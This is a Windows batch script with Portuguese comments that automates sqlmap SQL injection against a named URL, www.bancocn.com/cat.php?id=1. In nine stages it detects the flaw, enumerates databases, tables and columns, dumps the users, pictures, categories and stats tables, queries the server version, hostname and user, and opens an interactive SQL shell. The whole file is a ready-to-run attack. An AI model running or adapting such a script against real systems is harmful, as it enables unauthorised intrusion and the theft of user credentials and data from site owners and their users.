@echo off
REM Script de Exploração SQL Injection - BancoCN (Windows)
REM Uso: exploit_bancocn.bat

set URL=http://www.bancocn.com/cat.php?id=1
set PARAM=id
set DB=bancocn
set TABLE_USERS=users
set TABLE_PICTURES=pictures

echo ==========================================
echo   Script de Exploracao SQL Injection
echo   Target: %URL%
echo ==========================================
echo.

REM Verificar se sqlmap está instalado
where sqlmap >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERRO] sqlmap nao encontrado!
    echo Instale o sqlmap primeiro.
    pause
    exit /b 1
)

REM Etapa 1: Detecção inicial
echo [ETAPA 1] Detectando vulnerabilidade SQL Injection
sqlmap -u "%URL%" -p %PARAM% --dbms=mysql --batch
echo.
echo ----------------------------------------
echo.

REM Etapa 2: Listar bancos de dados
echo [ETAPA 2] Listando bancos de dados
sqlmap -u "%URL%" -p %PARAM% --dbs --batch
echo.
echo ----------------------------------------
echo.

REM Etapa 3: Listar tabelas
echo [ETAPA 3] Listando tabelas do banco '%DB%'
sqlmap -u "%URL%" -p %PARAM% -D %DB% --tables --batch
echo.
echo ----------------------------------------
echo.

REM Etapa 4: Listar colunas
echo [ETAPA 4] Listando colunas da tabela '%TABLE_USERS%'
sqlmap -u "%URL%" -p %PARAM% -D %DB% -T %TABLE_USERS% --columns --batch
echo.
echo ----------------------------------------
echo.

REM Etapa 5: Dump da tabela users
echo [ETAPA 5] Fazendo dump da tabela '%TABLE_USERS%'
sqlmap -u "%URL%" -p %PARAM% -D %DB% -T %TABLE_USERS% --dump --batch
echo.
echo ----------------------------------------
echo.

REM Etapa 6: Dump da tabela pictures
echo [ETAPA 6] Fazendo dump da tabela '%TABLE_PICTURES%'
sqlmap -u "%URL%" -p %PARAM% -D %DB% -T %TABLE_PICTURES% --dump --batch
echo.
echo ----------------------------------------
echo.

REM Etapa 7: Dump de outras tabelas
echo [ETAPA 7] Fazendo dump das outras tabelas
sqlmap -u "%URL%" -p %PARAM% -D %DB% -T categories --dump --batch
sqlmap -u "%URL%" -p %PARAM% -D %DB% -T stats --dump --batch
echo.
echo ----------------------------------------
echo.

REM Etapa 8: Informações do sistema
echo [ETAPA 8] Coletando informacoes do sistema
sqlmap -u "%URL%" -p %PARAM% --sql-query="SELECT @@version, @@hostname, USER(), DATABASE()" --batch
echo.
echo ----------------------------------------
echo.

REM Etapa 9: SQL Shell interativo
echo [ETAPA 9] Abrindo SQL Shell interativo
echo Voce pode executar queries SQL diretamente
echo Digite 'q' ou 'x' para sair
echo.
echo Exemplos de queries uteis:
echo   SELECT * FROM users;
echo   SELECT table_name FROM information_schema.tables WHERE table_schema='%DB%';
echo   SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';
echo   SELECT @@version;
echo   SELECT @@secure_file_priv;
echo   SELECT CURRENT_USER();
echo.
pause

sqlmap -u "%URL%" -p %PARAM% --sql-shell

echo.
echo [+] Exploracao concluida!
echo [*] Dados salvos em: %USERPROFILE%\.local\share\sqlmap\output\www.bancocn.com\
echo.
pause

